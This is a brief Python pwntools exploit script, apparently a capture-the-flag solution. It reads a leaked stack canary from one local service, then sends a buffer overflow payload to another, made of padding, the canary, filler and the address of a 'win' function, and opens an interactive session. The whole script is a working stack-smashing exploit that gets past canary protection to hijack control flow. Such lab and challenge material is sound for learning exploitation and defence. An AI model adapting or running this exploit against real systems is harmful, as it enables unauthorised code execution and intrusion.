#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'main')

io = remote('localhost', 37373) # so make another code that will print you canary 
canary = io.readline()[:-1]
print(canary)
print(hex(exe.symbols["_Z3winv"]))
io.close()
io = remote('localhost', 17171)
io.sendline(b'A'*8 + canary + p64(0) * 5 + p64(exe.symbols["_Z3winv"]))

io.interactive()

